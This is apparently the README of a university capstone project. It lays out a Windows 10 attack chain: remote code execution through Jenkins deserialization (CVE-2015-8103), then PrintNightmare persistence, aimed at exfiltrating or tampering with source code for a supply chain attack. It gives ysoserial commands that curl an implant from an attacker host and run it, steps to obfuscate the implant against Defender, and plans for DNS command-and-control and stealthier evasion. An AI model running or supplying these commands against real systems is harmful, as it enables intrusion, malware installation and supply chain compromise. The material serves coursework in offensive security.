
# CS 564 Capstone Project
- Team Cryptid

# Info
- Target             : Windows 10
- Initial Compromise : Java Deserialization in Jenkins <= 1.638 (CVE-2015-8103)
- Persistence        : Printer Nightmare (CVE-2021-34527) to create backdoor admin account
- Purpose            : Exfiltrate source/modify source code for supply chain attack

## Vulnerable Environement Setup
- Install Windows 10 VM
- Disable Windows firewall (or at least allow traffic to port 8080 / whatever Jenkins is set to use)
- Set the following registry values at `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint`:
    - RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    - NoWarningNoElevationOnInstall                 REG_DWORD    0x1
- Donwload and install JDK 11 from https://aka.ms/download-jdk/microsoft-jdk-11.0.22-windows-x64.msi
    - Make sure to enable the option to add `JAVA_HOME` to the PATH
    - You can run `java --version` in the Windows Command prompt to see if it installed properly
- Download vulnerable Jenkins version from https://get.jenkins.io/war/1.625/
- To run Jenkins, execute `java -jar /path/to/jenkins.war`
- Now Jenkins should be running on port 8080

## Building the Implant
- `cd` into the `implant/` directory and run `cl implant.c /Os /Fe:implant.exe /Zi`
    - Note: requires Visual Studio to be installed
- Run the Alcatraz obfuscator on the implant (https://github.com/weak1337/Alcatraz)
    - Note: Do this in a VM to be safe since Defender flags Alcatraz as malware.
    - You will need to copy all of the geneated files over before running Alcatraz (`.pdb, .ilk, .exe` etc...)
    - In Alcatraz, obfuscate all functions, and ensure entrypoint obfuscation is checked
    - This produces `implant.obfs.exe`
    - Rename `implant.obs.exe` to `cryptid.exe`

## Running the Exploit
- Generate serialized java payload: https://github.com/frohoff/ysoserial
    - `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar`
    - Example payloads that download an implant from 192.168.187.13:8080 and executes it:
    - `java -jar ysoserial-all.jar CommonsCollections7 "curl 192.168.187.13:8080/cryptid.exe --output jenkinsTelem.exe"` > download.java
    - `java -jar ysoserial-all.jar CommonsCollections7 "jenkinsTelem.exe"` > execute.java
- Python exploit script from https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py
- Run `python exploit.py [IP] [PORT] /path/to/java/payload`
    - If you are downloading the implant, make sure you are hosting it on a webserver before you run the exploit
    - Ex: `python -m http.server 8080`
- Other Jenkins vulns here:
    - https://github.com/gquere/pwn_jenkins

## TODO
- Max size for file writes is 100 Kb - increase this?

## Future Improvements
- Use HTTPS rather than HTTP
    - Don't need to implement encryption ourselves
- Do C2 over DNS and exfil over HTTPS instead (synchronization issues)
    - Much higher exfiltration bandwidth
- Write a custom packer to make reversing even harder
    - Tried using UPX, got flagged instantly
- Use a custom payload for printer nightmare
    - The built-in payload is flagged when host is connected to the internet
- Delete binary after exit more stealithly
    - Instead of spawning cmd, maybe spawn a different process and create a remote thread
- String obfuscation
    - Can get useful data from strings in binary
